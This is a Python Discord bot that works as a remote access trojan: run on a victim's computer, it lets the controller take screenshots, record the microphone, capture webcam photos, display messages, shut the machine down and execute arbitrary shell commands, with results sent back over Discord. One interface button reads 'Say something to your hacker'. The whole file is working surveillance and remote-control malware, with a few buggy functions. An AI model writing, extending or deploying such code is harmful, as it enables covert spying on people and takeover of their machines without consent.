import discord
from discord.ext import commands
import asyncio
import os
import subprocess
import time
from cv2 import cv2

token = "" #bot token
prefix = "rev!"
bot = discord.Client()
message = discord.Message
bot = commands.Bot(command_prefix=prefix, self_bot=False)
@bot.command()
async def shutdown(ctx):
    await ctx.send("Shutting down client...")
    os.system("shutdown")
@bot.command()
async def screenshot(ctx): 
    await ctx.send("Screenshot from client")
    import pyautogui
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    await ctx.send(file=discord.File('screen.png'))
@bot.command()
async def popup(ctx, *,message:str):
    await ctx.send("Message box showed with text: " + message)
    from tkinter import Tk
    import tkinter.messagebox
    root=Tk()
    tkinter.messagebox.showinfo('Pop Up!', message)
    root.mainloop()
@bot.command()
async def say(ctx, *,message:str):
    await ctx.send("Saying to client via audio: " + message)
    from gtts import gTTS  
    from playsound import playsound  
    text = message
    language = "en"
    obj = gTTS(text=text, lang=language, slow=False)  
    obj.save("tts.mp3")  
    playsound("tts.mp3")
    time.sleep(1000)
    os.remove("tts.mp3")
    await ctx.send("Audio sent correctly!")
@bot.command()
async def micreg(ctx, args):
    await ctx.send("Recording audio for: " + args + " " + "seconds!")
    # import required libraries 
    # import required libraries 
    import sounddevice as sd 
    from scipy.io.wavfile import write 
    import wavio as wv 
    freq = 44100
    duration = int(args)
    recording = sd.rec(int(duration * freq), 
				    samplerate=freq, channels=2) 
    sd.wait() 
    write("recording0.wav", freq, recording) 
    wv.write("recording1.wav", recording, freq, sampwidth=2)
    await ctx.send(file=discord.File('recording1.wav'))
    os.remove("recording0.wav")
    os.remove("recording1.wav")
async def recievetext2(ctx, resulttext):
    await ctx.send("Client sayd: " + resulttext)
@bot.command()
async def receivetext(ctx, *,message:str):
    import tkinter as tk
    root=tk.Tk()
    root.geometry("400x240")
    def getTextInput():
        resulttext=textExample.get("1.0","end")
        recievetext2(resulttext)
    textExample=tk.Text(root, height=10)
    textExample.pack()
    btnRead=tk.Button(root, height=1, width=10, text="Say something to your hacker", 
                        command=getTextInput)
@bot.command()
async def webcamsnap(ctx):
    await ctx.send("Snapping photo from camera")
    c = cv2.VideoCapture(0)
    return_value, image = c.read()
    cv2.imwrite('camera.png', image)
    await ctx.send(file=discord.File('camera.png'))
    os.remove('camera.png')
@bot.command()
async def shellcommand(ctx, *,message:str):
    await ctx.send("Executed: " + message + " " + "with output")
    result = subprocess.run([message], capture_output=True)
    result2 = result.stdout.decode()
    await ctx.send(result2)
asyncio.set_event_loop(asyncio.new_event_loop())
loop = asyncio.new_event_loop()
bot.run(token, bot=True)
